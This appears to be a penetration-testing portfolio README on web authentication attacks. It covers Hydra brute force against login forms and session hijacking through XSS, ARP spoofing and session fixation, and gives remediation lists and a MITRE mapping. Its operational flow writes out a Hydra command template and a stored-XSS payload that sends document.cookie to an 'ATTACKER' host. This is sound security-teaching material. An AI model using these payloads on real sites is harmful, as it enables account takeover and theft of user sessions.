> **English** | [Italiano](README.md)

# Auth attacks - authentication and session management

> - **Phase:** Web Attack - Authentication & Session Management Testing
> - **Visibility:** High (brute force generates many login requests) / Medium (XSS for session hijacking) / High (ARP spoofing on LAN)
> - **Prerequisites:** Login endpoint identified, form and parameters analyzed with Burp Suite, wordlist available
> - **Output:** Finding WEB-009 (Brute Force), WEB-010 (Session Hijacking), user impersonation proof of concept

---

## Introduction

Authentication compromise allows impersonating legitimate users without knowing their credentials, gaining access to reserved data and functionality. This category covers OWASP A07:2021 (Identification and Authentication Failures) and A01:2021 (Broken Access Control) in its session management component.

The fundamental distinction between the two documented techniques:

- **Brute Force (WEB-009):** the attack occurs **before** login. The objective is to guess the correct password by systematically trying wordlist combinations. It requires the login form to be exposed and lacking protections (Rate Limiting, Account Lockout, CAPTCHA).

- **Session Hijacking (WEB-010):** the attack occurs **after** the victim is already authenticated. The objective is to steal the Session ID (usually in a cookie) to impersonate the session without knowing credentials. It requires an access vector to the cookie: XSS, network sniffing, or physical browser access.

The combination of both techniques forms a complete kill chain: brute force provides credentials, session hijacking maintains access even after password reset.

---

## Folder structure

```
auth-attacks/
+-- bruteforce-web/     # Hydra on HTTP/POST form - finding WEB-009
+-- session-hijacking/  # Cookie stealing, XSS, ARP spoofing - finding WEB-010
```

---

## `bruteforce-web/` - Web form brute force

**Finding ID:** `WEB-009` | **Severity:** `High` | **CVSS v3.1:** 7.5

### Operational context

Web Brute Force uses Hydra to automate login attempts on HTTP/POST forms. The main technical challenge is configuring Hydra to distinguish a successful login from a failed one, especially when the server uses redirects (302) instead of explicit error messages.

The technique documented in `bruteforce-web/README.md` includes:
- Form analysis with Firefox DevTools to identify correct parameters.
- Handling HTTP 302 (Redirect) codes that generate false positives.
- Logic inversion: searching for the success string (`S=Logout`) instead of the error string.
- Case study "The Laravel Wall": analysis of CSRF defenses (HTTP 419) that render Hydra ineffective on modern frameworks, and development of a Python script with session cookie management as an alternative.

### Common remediation

- **Rate Limiting:** no more than 5-10 login attempts per IP per minute.
- **Temporary Account Lockout:** account lock after N consecutive failed attempts (with user alert).
- **CAPTCHA:** human challenge to block automations.
- **Mandatory MFA:** even with compromised password, the second factor protects access.
- **Progressive Delay:** exponential delay after each failed attempt (1s, 2s, 4s...).

---

## `session-hijacking/` - Session hijacking

**Finding ID:** `WEB-010` | **Severity:** `High` | **CVSS v3.1:** 8.0

### Operational context

Session Hijacking exploits the fact that the HTTP protocol is stateless: the server uses a Session ID (often in a cookie) to "remember" who is authenticated. Whoever possesses that cookie is the user, regardless of how they obtained it.

The technique documented in `session-hijacking/README.md` covers 4 scenarios:
- **Scenario A (Basic):** manual cookie copy from one browser to another (proof of concept).
- **Scenario B (XSS + Cookie Stealing):** Stored XSS payload in the Guestbook to steal the cookie automatically and send it to the attacker's server.
- **Scenario C (ARP Spoofing + Wireshark):** MitM positioning on the LAN with Ettercap to capture the cookie in transit over unencrypted HTTP traffic.
- **Scenario D (Session Fixation):** the attacker imposes a known Session ID on the victim before login.

The XSS vector (Scenario B) is the most common and dangerous in modern Red Teaming because it does not require physical access or presence on the same network.

### Common remediation

- **`HttpOnly` flag mandatory:** makes the cookie invisible to JavaScript - prevents theft via XSS.
- **`Secure` flag mandatory:** cookie transmitted only over HTTPS - prevents HTTP sniffing.
- **`SameSite=Strict` flag:** prevents cookie sending on cross-site requests.
- **Session Rotation:** regenerate the Session ID after every login and privilege change.
- **HTTPS across the entire application:** prevents network sniffing (Scenario C).

---

## Recommended operational flow

```
[1] Authentication Reconnaissance
     +-- form analysis with Burp Suite (parameters, method, redirect)
     +-- identify success/error string
              |
              v
[2] Brute Force (bruteforce-web/)
     +-- hydra -l <USER> -P passlist.txt <TARGET> http-post-form "..."
     +-- if server uses JSON -> Python script with requests.Session()
              |
              v
[3] Access obtained -> session verification
     +-- inspect cookie: has HttpOnly? Has Secure? Has SameSite?
              |
              v
[4] If HttpOnly absent -> Session Hijacking via XSS (session-hijacking/)
     +-- payload: <script>new Image().src='http://ATTACKER/?c='+document.cookie</script>
     +-- if HTTP (not HTTPS) -> ARP spoofing + Wireshark sniffing
              |
              v
[5] Cookie obtained -> Injection in attacker's browser
     +-- document.cookie = "login=<STOLEN_COOKIE>"
     +-- page refresh -> impersonated session
```

---

## Reference tools

| tool | type | technique/access | primary use case |
| :--- | :--- | :--- | :--- |
| `hydra` | password cracking | cli - active | brute force on network protocols and web forms |
| `medusa` | password cracking | cli - active | hydra alternative, better on some protocols |
| `burpsuite Intruder` | web proxy | gui - active | brute force integrated in proxy, with csrf handling |
| `python requests` | scripting | cli - active | custom brute force with session and cookie management |
| `ettercap` | arp spoofing | gui/cli - active | arp poisoning for mitm on lan |
| `wireshark` | network sniffer | gui - passive | packet capture and http cookie filtering |
| `xsshunter` | blind xss | web saas | oob payloads to confirm xss in non-visible areas |

---

## MITRE ATT&CK mapping

| tactic | technique | mitre id | action description |
| :--- | :--- | :--- | :--- |
| credential access | brute force: password guessing | `T1110.001` | attack with hydra on login form using `passlist.txt` wordlist (WEB-009) |
| credential access | brute force: password spraying | `T1110.004` | attempt with common passwords (admin, 123456, test) on multiple users (WEB-009) |
| credential access | modify authentication process | `T1556` | analysis and bypass of framework authentication mechanisms (laravel sanctum csrf) |
| credential access | steal web session cookie | `T1539` | theft of cookie `login=test%2Ftest` through stored xss (WEB-010) |
| collection | man-in-the-middle: aitm https interception | `T1557.002` | arp spoofing with ettercap and http cookie capture with wireshark (WEB-010 - scenario c) |
| defense evasion | use alternate authentication material: web session cookie | `T1550.004` | injection of stolen cookie in attacker's browser to impersonate the session (WEB-010) |
| initial access | exploit public-facing application | `T1190` | exploitation of missing rate limiting to perform brute force on login form (WEB-009) |

---

> **Note:** Activities documented in this section were conducted on `testphp.vulnweb.com` (Acunetix test environment) and on local applications (Docker). The lab setup included two virtual machines: Kali Purple (attacker, IP: 192.168.0.110) and Windows 10 (victim). Replicating these techniques on real systems requires explicit written authorization.
